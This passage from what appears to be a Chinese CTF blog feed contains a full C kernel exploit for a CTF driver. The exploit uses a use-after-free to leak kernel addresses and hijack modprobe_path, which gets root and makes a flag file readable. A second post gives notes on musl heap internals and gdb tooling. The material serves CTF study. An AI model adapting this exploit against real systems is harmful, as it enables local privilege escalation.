class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xffffffff82444700  <span class="comment">// cat /proc/kallsyms | grep modprobe_path</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOT_SCRIPT_PATH  <span class="string">&quot;/home/getshell&quot;</span></span></span><br><span class="line"><span class="type">char</span> root_cmd[] = <span class="string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Data</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> *ptr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> length;</span><br><span class="line">&#125;data;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x1111111</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x6666666</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">int</span> dev_fd, <span class="keyword">struct</span> Data *data)</span>&#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0x7777777</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> dev_fd[<span class="number">5</span>], root_script_fd, flag_fd;</span><br><span class="line">    <span class="type">size_t</span> kernel_heap_leak, kernel_text_leak;</span><br><span class="line">    <span class="type">size_t</span> kernel_base, kernel_offset, page_offset_base;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* fundamental works */</span></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        dev_fd[i] = open(<span class="string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create fake modprobe_path file */</span></span><br><span class="line">    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);</span><br><span class="line">    write(root_script_fd, root_cmd, <span class="keyword">sizeof</span>(root_cmd));</span><br><span class="line">    close(root_script_fd);</span><br><span class="line">    system(<span class="string">&quot;chmod +x &quot;</span> ROOT_SCRIPT_PATH);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct UAF */</span></span><br><span class="line">    data.ptr = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x50</span>;</span><br><span class="line">    <span class="built_in">memset</span>(data.ptr, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    add(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    edit(dev_fd[<span class="number">0</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* leak kernel heap addr and guess the page_offset_base */</span></span><br><span class="line">    show(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    kernel_heap_leak = data.ptr[<span class="number">0</span>];</span><br><span class="line">    page_offset_base = kernel_heap_leak &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel heap leak: 0x%lx\n&quot;</span>, kernel_heap_leak);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] GUESSING page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to alloc fake chunk at (page_offset_base + 0x9d000 - 0x10) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] leaking kernel base...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = page_offset_base + <span class="number">0x9d000</span> - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    edit(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    add(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    add(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    data.length = <span class="number">0x40</span>;</span><br><span class="line">    show(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    <span class="keyword">if</span> ((data.ptr[<span class="number">2</span>] &amp; <span class="number">0xfff</span>) != <span class="number">0x30</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] invalid data leak: 0x%lx\n&quot;</span>, data.ptr[<span class="number">2</span>]);</span><br><span class="line">        err_exit(<span class="string">&quot;\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_base = data.ptr[<span class="number">2</span>] - <span class="number">0x30</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel base&quot;</span>, kernel_base);</span><br><span class="line">    hexx(<span class="string">&quot;kernel offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the modprobe_path, we&#x27;ll let it requesting new slub page for it */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    add(dev_fd[<span class="number">1</span>], &amp;data);</span><br><span class="line">    close(dev_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    data.ptr[<span class="number">0</span>] = kernel_offset + MODPROBE_PATH - <span class="number">0x10</span>;</span><br><span class="line">    data.offset = <span class="number">0</span>;</span><br><span class="line">    data.length = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    edit(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    add(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line">    add(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;data.ptr[<span class="number">2</span>], ROOT_SCRIPT_PATH);</span><br><span class="line">    data.length = <span class="number">0x30</span>;</span><br><span class="line">    edit(dev_fd[<span class="number">2</span>], &amp;data);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger the fake modprobe_path */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigerring fake modprobe_path...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/home/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read flag */</span></span><br><span class="line">    <span class="built_in">memset</span>(flag, <span class="number">0</span>, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    </span><br><span class="line">    flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;failed to chmod flag!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(flag_fd, flag, <span class="keyword">sizeof</span>(flag));</span><br><span class="line">    hexx(<span class="string">&quot;flag&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;主要记录一些入门级别的&lt;code&gt;kernel pwn&lt;/code&gt;和一些平时做题要经常用到的命令&lt;/p&gt;
&lt;h1 id=&quot;做题技巧&quot;&gt;&lt;a href=&quot;#做题技巧&quot; class=&quot;headerlink&quot; title=&quot;做题技巧&quot;&gt;&lt;/a&gt;做题技巧&lt;/h1&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>初探musl</title>
    <link href="https://qanux.github.io/2024/01/17/musl/"/>
    <id>https://qanux.github.io/2024/01/17/musl/</id>
    <published>2024-01-16T16:00:00.000Z</published>
    <updated>2024-03-14T16:33:51.159Z</updated>
    
    <content type="html"><![CDATA[<p>其实就是对各位大佬博客的各种摘抄和总结···，方便自己以后做题</p><h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><p>chunk:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">    <span class="type">uint8_t</span> idx;  <span class="comment">//低5bit为idx第几个chunk</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">//与第一个chunk起始地址的偏移，实际地址偏移为offset * UNIT,详细请看get_meta源码中得到group地址的而过程！</span></span><br><span class="line">    <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在释放后 <code>chunk</code> 头的 <code>idx</code>会变成<code>0xff</code> <code>offset</code> 会清零</p><h3 id="group"><a href="#group" class="headerlink" title="group:"></a>group:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">//padding=0x10B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在<code>musl</code>中同一类大小的<code>chunk</code>都是被分配到同一个<code>group</code>中进行管理</p><h3 id="meta"><a href="#meta" class="headerlink" title="meta:"></a>meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;<span class="comment">// bitmap 的形式体现 chunk 的状态</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">// 代表meta否可以被回收 freeable=0 代表不可以 =1 代表可以</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">// sizeclass=6 表示由0x6这个group进行管理这一类的大小的chunk</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;<span class="comment">// meta-&gt;maplen = (needed+4095)/4096</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>maplen &gt;&#x3D; 1表示这个<code>meta</code>里的<code>group</code>是新<code>mmap</code>出来的,长度为多少,并且这个<code>group</code> 不在<code>size_classes</code>里<br>maplen &#x3D;0 表示<code>group</code>不是新<code>mmap</code>出来的在<code>size_classes</code>里<br>细节：</p><ul><li><code>meta</code>一般申请的是堆空间<code>brk</code>分配的，有可能是<code>mmap</code>映射的，而<code>group</code>都是使用的<code>mmap</code>的空间</li><li>由于<code>bitmap</code>的限制,因此一个<code>group</code>中最多只能有<code>32</code>个<code>chunk</code></li></ul><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area:"></a>meta_area:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;<span class="comment">// 是个校验数字 保护meta_area 里的meta，防止meta被 伪造</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">// 指向下一个meta_area 如果没有 就默认为0</span></span><br><span class="line">    <span class="type">int</span> nslots;<span class="comment">// meta 槽的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>meta_area 是管理<code>meta</code>的合集 <code>meta_area</code> 以页为单位分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> <span class="title">area</span> =</span> (<span class="type">void</span> )((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>)</span><br></pre></td></tr></table></figure><p>细节：</p><ul><li>在这个<code>meta_area</code>页被使用的时候，上一个临近的页会被设置为不可写是为了防止 使用者覆盖<code>check</code>校验值</li></ul><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context:"></a>__malloc_context:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;<span class="comment">// 和meta_area 头的check 是同一个值 就是校验值</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;<span class="comment">//是否初始化标记</span></span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;<span class="comment">// 记录有多少mmap 的内存的数量</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// 被free 的meta 头 这里meta 管理使用了队列和双向循环链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//指向可用meta数组</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// 记录着可用的meta</span></span><br><span class="line">    <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>是<code>musl libc</code>记录结构状态的表，记录各个<code>meta</code> 和 <code>secret</code> 队列信息等</p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><ul><li><code>musl</code> 中堆的管理由<code>meta</code> 管理 <code>group</code> ，<code>group</code> 管理 <code>chunk</code></li><li>在<code>free</code> 或者 <code>malloc chunk</code> 的时候又是从 <code>chunk</code> 到<code>group</code> 再到<code>meta</code> 从小到大索引</li><li><code>meta</code> 间通过<code>meta</code> 中<code>prev next</code> 结构形成循环链表连接</li></ul><h2 id="gdb调试技巧"><a href="#gdb调试技巧" class="headerlink" title="gdb调试技巧"></a>gdb调试技巧</h2><p>下载<code>xf1le</code>师傅的<code>gdb</code>插件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/xf1les/muslheap.git  </span><br><span class="line">echo &quot;source /path/to/muslheap.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h3 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h3><p>可以查看<code>__malloc_context</code>的部分信息，可以详细看到每一条<code>meta</code>链表</p><img src="/2024/01/17/musl/1.png" class="" title="我的图图呢">  <h3 id="p-malloc-context"><a href="#p-malloc-context" class="headerlink" title="p __malloc_context"></a>p __malloc_context</h3><p>可以查看<code>__malloc_context</code>的详细信息，但无法详细看到每一条<code>meta</code>链表</p><img src="/2024/01/17/musl/2.png" class="" title="我的图图呢">  <h3 id="mmagic"><a href="#mmagic" class="headerlink" title="mmagic"></a>mmagic</h3><p>用于查看关键函数的地址</p><img src="/2024/01/17/musl/3.png" class="" title="我的图图呢">  <h3 id="p-struct-meta"><a href="#p-struct-meta" class="headerlink" title="p (struct meta)&lt;meta地址&gt;"></a>p <em>(struct meta</em>)&lt;meta地址&gt;</h3><p>查看某个<code>meta</code>结构体的详细信息</p><img src="/2024/01/17/musl/4.png" class="" title="我的图图呢">  <h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>这里直接贴上<code>0xRGz</code>师傅的文章</p><img src="/2024/01/17/musl/5.png" class="" title="我的图图呢">  <h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>这里一样直接贴上<code>0xRGz</code>师傅的文章<code>Orz</code><br>free流程：</p><ul><li>通过<code>get_meta(p)</code>得到<code>meta</code> (<code>get_meta</code> 是通过<code>chunk</code> 对应的<code>offset</code> 索引到对应的<code>group</code> 再索引到<code>meta</code>) 下面会详细介绍<code>get_meta</code></li><li>通过<code>get_slot_index(p)</code>得到对应<code>chunk</code>的 <code>idx</code> -&gt; 通过<code>get_nominal_size(p, end)</code> 算出真实大小</li><li>重置<code>idx</code> 和 <code>offset idx</code> 被置为<code>0xff</code> 标记<code>chunk</code></li><li>修改<code>freed_mask</code> 标记<code>chunk</code>被释放</li><li>最后调用<code>nontrivial_free</code> 完成关于<code>meta</code>一些剩余操作</li></ul><h2 id="pwn题常用技巧"><a href="#pwn题常用技巧" class="headerlink" 